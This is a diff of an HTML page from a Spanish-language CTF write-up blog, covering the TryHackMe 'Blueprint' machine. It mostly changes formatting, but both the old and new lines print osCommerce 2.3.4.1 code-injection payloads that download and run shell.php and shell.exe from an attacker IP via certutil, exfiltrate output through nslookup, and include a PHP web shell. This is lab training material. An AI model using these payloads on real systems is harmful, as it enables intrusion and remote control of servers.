@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,11 +1578,11 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/oscommerce-2.3.4.1/" class="single__tag" title="osCommerce 2.3.4.1">#osCommerce 2.3.4.1</a></li>
+  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">#metasploit</a></li>
 
   <li><a href="https://sckull.github.io/tags/dns-exfil/" class="single__tag" title="DNS exfil">#DNS exfil</a></li>
 
-  <li><a href="https://sckull.github.io/tags/metasploit/" class="single__tag" title="metasploit">#metasploit</a></li>
+  <li><a href="https://sckull.github.io/tags/oscommerce-2.3.4.1/" class="single__tag" title="osCommerce 2.3.4.1">#osCommerce 2.3.4.1</a></li>
 
 </ul>
     </div>
@@ -1630,7 +1630,7 @@
 </table>
 <br>
 <hr />
-<h2 id="masscan--nmap">MASSCAN &amp; NMAP</h2>
+<h2 id="masscan--nmap-">MASSCAN &amp; NMAP</h2>
 <p>Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1798,10 +1798,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Encontramos que en el puerto 8080 esta corriendo osCommerce.</p>
 <p><img src="/images/posts/thm/blueprint/Screenshot_2019-12-27_22-24-42.webp" alt="image" /></p>
-<h2 id="gobuster">GOBUSTER</h2>
+<h2 id="gobuster-">GOBUSTER</h2>
 <p>Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1951,10 +1951,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 /tell_a_friend.php <span class="o">(</span>Status: 302<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="searcsploit">SEARCSPLOIT</h2>
+</div><h2 id="searcsploit-">SEARCSPLOIT</h2>
 <p>Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.</p>
 <p><img src="/images/posts/thm/blueprint/Screenshot_2019-12-27_22-27-20.webp" alt="image" /></p>
-<h2 id="oscommerce-2341---remote-code-execution">osCommerce 2.3.4.1 - Remote Code Execution</h2>
+<h2 id="oscommerce-2341---remote-code-execution-">osCommerce 2.3.4.1 - Remote Code Execution</h2>
 <p>Utilizamos el exploit <code>Remote Code Execution</code>, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.</p>
 <p>Para poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de <a href="https://www.youtube.com/watch?v=Egwp5zc5ZIM"><strong>DNS exfil</strong></a> (y por los loles xd).</p>
 <p>Nuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.</p>
@@ -1979,10 +1979,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">payload</span> <span class="o">=</span> <span class="s1">&#39;\&#39;);&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;$var = shell_exec(&#34;cmd.exe /C echo \&#39;hello\&#39; &gt; hehe.txt &amp; nslookup test 10.8.1.72 &#34;);&#39;</span> 
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;echo $var;&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;/*&#39;</span>
+<pre class="chroma"><code class="language-php" data-lang="php">payload = &#39;\&#39;);&#39;
+payload += &#39;$var = shell_exec(&#34;cmd.exe /C echo \&#39;hello\&#39; &gt; hehe.txt <span class="err">&amp;</span> nslookup test 10.8.1.72 &#34;);&#39; 
+payload += &#39;echo $var;&#39;
+payload += &#39;/*&#39;
 </code></pre></td></tr></table>
 </div>
 </div><p>Vemos que que el archivo se creó exitosamente:</p>
@@ -1993,8 +1993,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>Nuestro payload para descargar el archivo en la maquina utilizando <code>certutil</code>:</p>
 <div class="highlight"><div class="chroma">
@@ -2005,10 +2005,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">payload</span> <span class="o">=</span> <span class="s1">&#39;\&#39;);&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;$var = shell_exec(&#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php &amp; nslookup test 10.8.1.72 &#34;);&#39;</span> 
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;echo $var;&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;/*&#39;</span>
+<pre class="chroma"><code class="language-php" data-lang="php">payload = &#39;\&#39;);&#39;
+payload += &#39;$var = shell_exec(&#34;cmd.exe /C certutil -urlcache -split -f http://10.8.1.72/shell.php shell.php <span class="err">&amp;</span> nslookup test 10.8.1.72 &#34;);&#39; 
+payload += &#39;echo $var;&#39;
+payload += &#39;/*&#39;
 </code></pre></td></tr></table>
 </div>
 </div><p><img src="/images/posts/thm/blueprint/Screenshot_2019-12-27_23-07-26.webp" alt="image" /></p>
@@ -2016,7 +2016,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p><img src="/images/posts/thm/blueprint/Screenshot_2019-12-27_23-13-14.webp" alt="image" /></p>
 <p>Tenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.</p>
 <p><img src="/images/posts/thm/blueprint/Screenshot_2019-12-27_23-15-29.webp" alt="image" /></p>
-<h2 id="shell---metasploit">Shell - Metasploit</h2>
+<h2 id="shell---metasploit-">Shell - Metasploit</h2>
 <p>Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.</p>
 <p>Msfvenom:</p>
 <div class="highlight"><div class="chroma">
@@ -2053,10 +2053,10 @@ exploit
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">payload</span> <span class="o">=</span> <span class="s1">&#39;\&#39;);&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;$var = shell_exec(&#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe &amp; shell.exe &amp; nslookup test 10.8.1.72 &#34;);&#39;</span> 
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;echo $var;&#39;</span>
-<span class="nx">payload</span> <span class="o">+=</span> <span class="s1">&#39;/*&#39;</span>
+<pre class="chroma"><code class="language-php" data-lang="php">payload = &#39;\&#39;);&#39;
+payload += &#39;$var = shell_exec(&#34;cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe <span class="err">&amp;</span> shell.exe <span class="err">&amp;</span> nslookup test 10.8.1.72 &#34;);&#39; 
+payload += &#39;echo $var;&#39;
+payload += &#39;/*&#39;
 </code></pre></td></tr></table>
 </div>
 </div><p>Obtuvimos una sesion meterpreter:</p>
@@ -3417,7 +3417,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3465,12 +3465,12 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#masscan--nmap">MASSCAN &amp; NMAP</a></li>
-        <li><a href="#http">HTTP</a></li>
-        <li><a href="#gobuster">GOBUSTER</a></li>
-        <li><a href="#searcsploit">SEARCSPLOIT</a></li>
-        <li><a href="#oscommerce-2341---remote-code-execution">osCommerce 2.3.4.1 - Remote Code Execution</a></li>
-        <li><a href="#shell---metasploit">Shell - Metasploit</a></li>
+        <li><a href="#masscan--nmap-">MASSCAN &amp; NMAP</a></li>
+        <li><a href="#http-">HTTP</a></li>
+        <li><a href="#gobuster-">GOBUSTER</a></li>
+        <li><a href="#searcsploit-">SEARCSPLOIT</a></li>
+        <li><a href="#oscommerce-2341---remote-code-execution-">osCommerce 2.3.4.1 - Remote Code Execution</a></li>
+        <li><a href="#shell---metasploit-">Shell - Metasploit</a></li>
       </ul>
     </li>
   </ul>
